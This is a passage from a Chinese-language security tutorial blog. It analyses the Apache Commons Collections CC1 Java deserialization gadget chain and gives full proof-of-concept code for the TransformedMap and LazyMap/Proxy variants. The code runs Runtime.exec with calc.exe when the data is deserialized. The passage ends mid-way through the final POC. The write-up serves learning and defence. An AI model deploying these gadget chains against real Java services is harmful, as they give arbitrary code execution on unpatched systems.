class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span> &#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        innerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/666309a74cd90.png" alt="image-20240528233409082"></p><p>结果如上图 代码没有报错 还输出了我们的序列化后的数据流</p><p>但是有一个问题是：</p><p>在我们最后反序列化的时候没有弹出计算器</p><p>原因：</p><p>这个实际上和<code>AnnotationInvocationHandler</code>类的逻辑有关，我们可以动态调试就会发现，在 AnnotationInvocationHandler.readObject 的逻辑中(class文件中可以看到)，有一个if语句对var7进行判断，<strong>只有在其不是null的时候才会进入里面执行setValue</strong>，否则不会进入也就不会触发漏洞</p><p><img src="https://bu.dusays.com/2024/06/07/666309a6f18b3.png" alt="image-20240529155323694"></p><p>那么如何让这个var7不为null呢</p><p>解决：</p><ul><li><p>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X </p></li><li><p>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</p></li></ul><p>所以这也解释了为什么我们前面要用到 <code>Retention.class</code> ，因为Retention有一个方法，名为<code>value</code>；所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span> &#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现了一点小状况 嗯 不知道为什么还是弹不出计算器 QAQ 目前还没找到原因 代码是没有问题的 </p><p>我也试了一下其他师傅的poc 也弹不起 但是我前面的demo可以弹</p><p>啧 应该是java环境的问题</p><p>但是代码试没有问题的</p><p>这里大家就假装我运行起了吧</p><p>晚点看看环境吧</p><p><img src="https://bu.dusays.com/2024/06/07/666309ab61180.png" alt="image-20240529013310392"></p><p>先装模做样运行起</p><p>破案了 就是版本问题 不知道为什么下成了8u111 啧 重新配了一下环境就好了</p><p><img src="https://bu.dusays.com/2024/06/07/666309a87456e.png" alt="image-20240529104203979"></p><p>调用流程：</p><blockquote><p>ObjectInputStream.readObject()<br>-&gt;AnnotationInvocationHandler.readObject()<br>   -&gt;TransformedMap.entrySet().iterator().next().setValue()<br>       -&gt;TransformedMap.checkSetValue()<br>     -&gt;TransformedMap.transform()<br>       -&gt;ChainedTransformer.transform()<br>         -&gt;ConstantTransformer.transform()<br>         -&gt;InvokerTransformer.transform()<br>           -&gt;Method.invoke()<br>             -&gt;Class.getMethod()<br>         -&gt;InvokerTransformer.transform()<br>           -&gt;Method.invoke()<br>             -&gt;Runtime.getRuntime()<br>         -&gt;InvokerTransformer.transform()<br>           -&gt;Method.invoke()<br>             -&gt;Runtime.exec()</p></blockquote><blockquote><p>高版本不能触发原因：</p><p>在8u71以后大概是2015年12月的时候，Java 官方修改了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的readObject函数</p><p>对于这次修改，有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接 使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去</p><p>所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执 行set或put操作，也就不会触发RCE了。</p></blockquote><p>怎么在高版本下触发cc 我们后面说 </p><p>我们再来看看ysoserial的LazyMap链</p><h3 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h3><p>其实CommonCollections1的真正利用链中应该用到的是LazyMap而不是TransformedMap</p><p>只是说TransformedMap也行</p><p>所以LazyMap是什么呢</p><p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继乘<code>AbstractMapDecorator</code>。</p><h4 id="分析构造链子-1"><a href="#分析构造链子-1" class="headerlink" title="分析构造链子"></a>分析构造链子</h4><p>LazyMap的漏洞触发点和TransformedMap唯一的差别是:</p><p>TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 <code>factory.transform</code> 。其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// Check if the key is already in the map</span></span><br><span class="line">    <span class="keyword">if</span> (!map.containsKey(key)) &#123;</span><br><span class="line">        <span class="comment">// If not, create a value for the key using the factory&#x27;s transform method</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        <span class="comment">// Put the new value into the map with its corresponding key</span></span><br><span class="line">        map.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Return the value associated with the key, either existing or just created</span></span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他会对 this.factory 进行一次 transform，所以我们拿这个来做为我们链子串联的对象</p><p>但是相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些，原因是在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的readObject方法中并<strong>没有直接调用到 Map的get方法</strong>。 </p><p>所以ysoserial找到了另一条路，<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法有调用到<strong>get</strong>(代表着我们可以通过这个方法来调用 LazyMap.get 方法)：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/666309a741761.png" alt="image-20240529162210286"></p><p>那么又如何能调用到 <code>AnnotationInvocationHandler.invoke</code> 呢？ysoserial的作者想到的是利用Java 的对象代理。</p><p><strong>对象代理</strong></p><p>java作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 <code>__call</code> ，我们需 要用到 <code>java.reflect.Proxy</code> ：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map pxmapMap=(Map)Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code> 的第一个参数是<code>ClassLoader</code>，我们用默认的即可；第二个参数是我们<strong>需要代理的对象集合</strong>；第三个参数是一个实现了<strong>InvocationHandler接口的对象</strong>，里面包含了具体代理的逻辑。</p><p>例：</p><p>我们写一个这样的类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码定义了一个<code>ExampleInvocationHandler</code>类，实现了<code>InvocationHandler</code>接口，用于处理代理对象上的方法调用。特别是，它<strong>拦截了<code>get</code>方法的调用</strong>，并打印一条消息后返回一个固定的字符串”Hooked Object”，从而演示了对原方法的hook（钩子）技术。对于非<code>get</code>方法的调用，则直接转发给被代理的<code>Map</code>对象。</p><p>在外部调用这个ExampleInvocationHandler：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑一下：</p><p><img src="https://bu.dusays.com/2024/06/07/666309a65e24c.png" alt="image-20240529165051369"></p><p>虽然我们向Map放入的hello值为world</p><p>但是发现输出了<code>Hacked Object</code></p><p>我们回头看 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，会发现实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 <code>AnnotationInvocationHandler.invoke</code> 方法中，进而触发我们的 <code>LazyMap.get</code> 。</p><p>发现好像前面没有说过<strong>InvocationHandler</strong></p><p>这里补充一下：</p><p><code>InvocationHandler</code>是Java反射包(<code>java.lang.reflect</code>)下的一个接口，<strong>它是实现Java动态代理的核心</strong>。当你想要在不修改目标对象的情况下，对其方法调用进行控制或扩展时（比如添加日志、权限控制、事物管理等），就可以使用<code>InvocationHandler</code>。</p><p>看一下源码：</p><p><img src="https://bu.dusays.com/2024/06/07/666309a590a7a.png" alt="image-20240529165717164"></p><p>代码很少：<br>就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">            <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>proxy</code>：代理实例，也就是通过<code>Proxy.newProxyInstance()</code>方法创建的代理对象。</li><li><code>method</code>：当前被调用的方法，对应于代理实例上调用的方法。</li><li><code>args</code>：被调用方法的参数数组。</li></ul><p>好 这样就可以构造我们的poc了</p><p>首先使用LazyMap替换 TransformedMap：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>原来是这样的：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br></pre></td></tr></table></figure><p>然后，我们需要对 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 对象进行Proxy：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(RetentionPolicy.class, outerMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>这段代码首先通过反射获取了<code>AnnotationInvocationHandler</code>类。</p><p>然后，获取其构造函数，并通过<code>setAccessible(true)</code>来绕过访问控制检查，以便可以实例化这个私有构造函数。</p><p>接着，使用这个构造函数创建了一个<code>InvocationHandler</code>实例，传入了<code>RetentionPolicy.class</code>和一个外部<code>Map</code>（<code>outerMap</code>）。</p><p>最后，利用<code>Proxy.newProxyInstance()</code>方法基于这个<code>InvocationHandler</code>创建了一个代理<code>Map</code>对象。</p><p>代理后的对象叫做<code>proxyMap</code>，但我们不能直接对其进行序列化，因为我们入口点是 <code>sun.reflect.annotation.AnnotationInvocationHandler.readObject</code> ，而且Proxy 内无 <code>writeObject</code> 方法，无法直接序列化</p><p>所以我们还需要再用 <code>AnnotationInvocationHandler</code>对这个proxyMap进行包裹：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class,</span><br><span class="line">proxyMap);</span><br></pre></td></tr></table></figure><p>其他的就和TransformedMap链一样了</p><p>所以：</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span 